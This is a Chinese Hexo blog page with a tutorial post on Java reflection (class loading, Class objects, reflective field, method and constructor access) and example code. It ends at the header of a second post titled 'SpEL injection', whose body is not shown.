<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/toux.jpg?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/toux.jpg?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/toux.jpg?v=5.1.4">


  <link rel="mask-icon" href="/images/toux.jpg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">





  <link rel="alternate" href="/atom.xml" title="peri0d的博客" type="application/atom+xml">






<meta name="description" content="待我尝尽世间甘苦，便喂你一勺甜。">
<meta property="og:type" content="website">
<meta property="og:title" content="peri0d的博客">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="peri0d的博客">
<meta property="og:description" content="待我尝尽世间甘苦，便喂你一勺甜。">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="peri0d的博客">
<meta name="twitter:description" content="待我尝尽世间甘苦，便喂你一勺甜。">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/">





  <title>peri0d的博客</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">peri0d的博客</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">peri0d</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/23/Java 反射机制/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="peri0d">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/toux.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="peri0d的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/07/23/Java 反射机制/" itemprop="url">Java 反射机制</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-23T20:27:52+08:00">
                2019-07-23
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Java/" itemprop="url" rel="index">
                    <span itemprop="name">Java</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Class-概述"><a href="#Class-概述" class="headerlink" title="Class 概述"></a>Class 概述</h1><ul>
<li><p>反射允许我们在运行时发现和使用类的信息</p>
</li>
<li><p>类型信息在运行时由被称为 <code>Class</code> 对象的特殊对象表示，它包含了与类有关的信息</p>
</li>
<li><p><code>Class</code> 对象就是用来创建类的所有的常规对象的</p>
</li>
<li><p>类是程序的一部分，每个类都有一个 <code>Class</code> 对象。每当编写并编译了一个新类，就会产生一个<code>Class</code> 对象，即被保存在一个同名的 <code>.class</code> 文件中。为了生成这个类的对象，运行这个程序的 Java 虚拟机将使用被称为 “类加载器” 的子系统。</p>
</li>
<li><p>所有的类都是在对其第一次使用时，动态加载到 JVM 中的。当程序创建第一个对类的静态成员引用时，就会加载这个类。在使用 <code>new</code> 创建类的新对象时，也会被当做对类的静态成员的引用。</p>
</li>
<li><p>Java 程序在其开始运行之前并非被完全加载，其各个部分是在必须时才加载的。这就是它的动态加载机制。</p>
</li>
<li><p>类加载器首先检查这个类的 <code>Class</code> 对象是否已经加载，如果尚未加载，默认的类加载器会根据类名查找 <code>.class</code> 文件。一旦某个类的 <code>Class</code> 对象被加载到内存，它就被用来创建这个类的所有对象。</p>
</li>
<li><p>以下面这段代码为例 : </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> net.mindview.util.Print.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Candy</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123; print(<span class="string">" loading Candy"</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Gum</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123; print(<span class="string">" loading Gum "</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cookie</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123; print(<span class="string">" loading Cookie "</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        print(<span class="string">" inside main "</span>);</span><br><span class="line">        <span class="keyword">new</span> Candy();</span><br><span class="line">        <span class="keyword">new</span> Candy();</span><br><span class="line">        print(<span class="string">" after create Candy "</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(<span class="string">"Gum"</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e)&#123;</span><br><span class="line">            print(<span class="string">" cannot find Gum "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        print(<span class="string">" after Class.forName(\"Gum\") "</span>);</span><br><span class="line">        <span class="keyword">new</span> Cookie();</span><br><span class="line">        print(<span class="string">" after create Cookie "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 输出</span></span><br><span class="line"><span class="comment"> inside main </span></span><br><span class="line"><span class="comment"> loading Candy</span></span><br><span class="line"><span class="comment"> after create Candy </span></span><br><span class="line"><span class="comment"> loading Gum </span></span><br><span class="line"><span class="comment"> after Class.forName("Gum") </span></span><br><span class="line"><span class="comment"> loading Cookie </span></span><br><span class="line"><span class="comment"> after create Cookie </span></span><br><span class="line"><span class="comment">/*</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>以上类中的 <code>static</code> 子句在类第一次被加载时执行。<code>Class</code> 对象仅在被需要时加载</p>
</li>
<li><p>对于 <code>forName</code> 函数，它是 <code>Class</code> 类的一个 static 成员，所有的 <code>Class</code> 对象都属于这个类。<code>Class</code> 对象和其他对象一样，我们可以获取并操作它的引用( 也就是类加载器的工作 )。<code>forName</code> 是取得 <code>Class</code> 对象的引用的一种方法，它是以类名的 string 作为参数，返回一个 <code>Class</code> 对象的引用，如果被引用类没有加载就加载该类。</p>
</li>
<li><p><code>getClass</code> 函数用来获取 <code>Class</code> 引用，它将返回表示该对象的实际类型的 <code>Class</code> 引用，即已知实例化对象获取类引用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> net.mindview.util.Print.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">HasBatteries</span> </span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Waterproof</span> </span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Shoots</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span>  <span class="title">Toy</span> </span>&#123;</span><br><span class="line">    Toy() &#123;&#125;</span><br><span class="line">    Toy(<span class="keyword">int</span> i) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// FancyToy 继承 Toy 并且继承三个接口</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FancyToy</span> <span class="keyword">extends</span> <span class="title">Toy</span> <span class="keyword">implements</span> <span class="title">HasBatteries</span>, <span class="title">Waterproof</span>, <span class="title">Shoots</span> </span>&#123;</span><br><span class="line">    FancyToy() &#123; <span class="keyword">super</span>(<span class="number">1</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printInfo</span><span class="params">(Class cc)</span> </span>&#123;</span><br><span class="line">        print(<span class="string">"Class name : "</span> + cc.getName() + <span class="string">" is interface? ["</span> + cc.isInterface() + <span class="string">"]"</span>);</span><br><span class="line">        print(<span class="string">"Simple name : "</span> + cc.getSimpleName());</span><br><span class="line">        print(<span class="string">"Canonical name : "</span> + cc.getCanonicalName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Class c = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            c = Class.forName(<span class="string">"FancyToy"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            print(<span class="string">"FancyToy was not found"</span>);</span><br><span class="line">            System.exit(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        printInfo(c);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(Class face : c.getInterfaces()) &#123;</span><br><span class="line">            printInfo(face);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取 c 的父类</span></span><br><span class="line">        Class up = c.getSuperclass();</span><br><span class="line">        Object obj = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 实例化 up 的对象</span></span><br><span class="line">            obj = up.newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            print(<span class="string">"cannot instance"</span>);</span><br><span class="line">            System.exit(<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            print(<span class="string">"cannot access"</span>);</span><br><span class="line">            System.exit(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取 Class 对象</span></span><br><span class="line">        printInfo(obj.getClass());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*输出</span></span><br><span class="line"><span class="comment">Class name : FancyToy is interface? [false]</span></span><br><span class="line"><span class="comment">Simple name : FancyToy</span></span><br><span class="line"><span class="comment">Canonical name : FancyToy</span></span><br><span class="line"><span class="comment">Class name : HasBatteries is interface? [true]</span></span><br><span class="line"><span class="comment">Simple name : HasBatteries</span></span><br><span class="line"><span class="comment">Canonical name : HasBatteries</span></span><br><span class="line"><span class="comment">Class name : Waterproof is interface? [true]</span></span><br><span class="line"><span class="comment">Simple name : Waterproof</span></span><br><span class="line"><span class="comment">Canonical name : Waterproof</span></span><br><span class="line"><span class="comment">Class name : Shoots is interface? [true]</span></span><br><span class="line"><span class="comment">Simple name : Shoots</span></span><br><span class="line"><span class="comment">Canonical name : Shoots</span></span><br><span class="line"><span class="comment">Class name : Toy is interface? [false]</span></span><br><span class="line"><span class="comment">Simple name : Toy</span></span><br><span class="line"><span class="comment">Canonical name : Toy</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<h1 id="反射概述"><a href="#反射概述" class="headerlink" title="反射概述"></a>反射概述</h1><ul>
<li><p><code>Class</code> 类与 <code>java.lang.reflect</code> 类库一起构成了对 “反射” 的支持，该类库包含了 <code>Field</code>, <code>Method</code> 和 <code>Constructor</code> 类。这些类型的对象是由 JVM 在运行时创建的，用以表示未知类里对应的成员。这样就可以使用 <code>Constructor</code> 创建新的对象，用 <code>get()</code> 和 <code>set()</code> 函数读取和修改与 <code>Filed</code> 对象关联的字段，用 <code>invoke()</code> 方法调用与 <code>Method</code> 对象关联的方法。</p>
</li>
<li><p>当通过反射与一个未知类型的对象打交道时，JVM 只是简单地检查这个对象，看它属于哪个特定类。在用它做其他事情之前加载那个类的 <code>Class</code> 对象。因此，那个类的 <code>.class</code> 文件对于 JVM 来说必须是可获得的。对于反射机制来说，<code>.class</code> 文件在编译时不可获取，所以在运行时打开和检查 <code>.class</code> 文件</p>
</li>
<li><p>反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性</p>
</li>
<li><p>反射就是把 Java 类中的内容视为 Java 对象。例如：一个类有：成员变量、方法、构造方法、包等等信息，利用反射技术可以对一个类进行解剖，把每个组成部分映射成一个个对象。</p>
</li>
<li><p>以下面代码为例，反射的含义</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> net.mindview.util.Print.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">       <span class="comment">// 正向 : 由类到实例化对象</span></span><br><span class="line">       Person person = <span class="keyword">new</span> Person();</span><br><span class="line">       <span class="comment">// 反向 : 由实例化对象到类，这里就意味着反射</span></span><br><span class="line">       print(person.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出 Person</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>以下面代码为例，如何实现反射及反射的利用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> net.mindview.util.Print.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        print(<span class="string">"hell Person"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       String s = <span class="string">"peri0d"</span>;</span><br><span class="line">       print(s);</span><br><span class="line">       print(s.getClass());</span><br><span class="line">       print(s.getClass().getName());</span><br><span class="line"></span><br><span class="line">       Person person = <span class="keyword">new</span> Person();</span><br><span class="line">       print(person.getClass());</span><br><span class="line">       print(person.getClass().getName());</span><br><span class="line"></span><br><span class="line">       Class c = <span class="keyword">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           c = Class.forName(<span class="string">"Person"</span>);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">           print(<span class="string">"Class Not Found"</span>);</span><br><span class="line">           System.exit(<span class="number">1</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       Object obj = <span class="keyword">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           obj = c.newInstance();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">           print(<span class="string">"cannot instance"</span>);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">           print(<span class="string">"cannot access"</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       Method met = <span class="keyword">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           met = obj.getClass().getDeclaredMethod(<span class="string">"hello"</span>, <span class="keyword">null</span>);</span><br><span class="line">           <span class="comment">// 赋予权限</span></span><br><span class="line">           met.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">           print(<span class="string">"No Such Method"</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           met.invoke(obj, <span class="keyword">null</span>);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">           print(<span class="string">"cannot access"</span>);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">           print(<span class="string">"cannot invocate target"</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*输出</span></span><br><span class="line"><span class="comment">peri0d</span></span><br><span class="line"><span class="comment">class java.lang.String</span></span><br><span class="line"><span class="comment">java.lang.String</span></span><br><span class="line"><span class="comment">class Person</span></span><br><span class="line"><span class="comment">Person</span></span><br><span class="line"><span class="comment">hell Person</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h1 id="反射实现"><a href="#反射实现" class="headerlink" title="反射实现"></a>反射实现</h1><ul>
<li><p>实例化对象的 <code>getClass()</code> 方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String s = <span class="string">"peri0d"</span>;</span><br><span class="line">print(s);					<span class="comment">// peri0d</span></span><br><span class="line">print(s.getClass());		 <span class="comment">// class java.lang.String</span></span><br><span class="line">print(s.getClass().getName());<span class="comment">// java.lang.String</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>forName()</code> 方法调用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;&#125;</span><br><span class="line">Class c = Class.forName(<span class="string">"Person"</span>);  <span class="comment">// 反射 Person 类</span></span><br><span class="line">Object obj = c.newInstance();	   <span class="comment">//  反射 Person 类的实例化对象</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>.class</code> 获取</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class k = Person.class;</span><br><span class="line">print(k.getName());    <span class="comment">// Person</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h1 id="反射属性"><a href="#反射属性" class="headerlink" title="反射属性"></a>反射属性</h1><ul>
<li><code>getField(String name)</code> : 获得某个公有属性</li>
<li><code>getFields()</code> : 获得所有公有属性</li>
<li><code>getDeclaredField(String name)</code>:  获得某个属性</li>
<li><code>getDeclaredFields()</code>:  获得所有属性</li>
<li><code>get(Object obj)</code> : 获取 <code>obj</code> 中的属性值</li>
<li><code>set(Object obj, Object value)</code> : 设置 <code>obj</code> 中对应的属性值</li>
</ul>
<h1 id="反射方法"><a href="#反射方法" class="headerlink" title="反射方法"></a>反射方法</h1><ul>
<li><code>getMethod(String name, Class parameterTypes)</code> : 获得该类某个公有方法</li>
<li><code>getMethods()</code> : 获得该类所有公有方法</li>
<li><code>getDeclaredMethod(String name, Class parameterTypes)</code> : 获得该类某个方法</li>
<li><code>getDeclaredMethods()</code> : 获得该类所有方法</li>
<li><code>invoke(Object obj, Object args)</code> : 传递 object 对象及调用方法的参数</li>
</ul>
<h1 id="反射构造器"><a href="#反射构造器" class="headerlink" title="反射构造器"></a>反射构造器</h1><ul>
<li><code>getConstructor(Class parameterTypes)</code> : 获得该类中与参数类型匹配的公有构造方法</li>
<li><code>getConstructors()</code> : 获得该类的所有公有构造方法</li>
<li><code>getDeclaredConstructor(Class parameterTypes)</code> : 获得该类中与参数类型匹配的构造方法</li>
<li><code>getDeclaredConstructors()</code> : 获得该类所有构造方法</li>
<li><code>newInstance(Object initargs)</code> : 根据传递的参数创建类的对象</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/23/SpEL 注入/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="peri0d">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/toux.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="peri0d的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/07/23/SpEL 注入/" itemprop="url">SpEL 注入</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-23T20:27:52+08:00">
                2019-07-23
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/代码审计/" itemprop="url" rel="index">
                    <span itemprop="name">代码审计</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
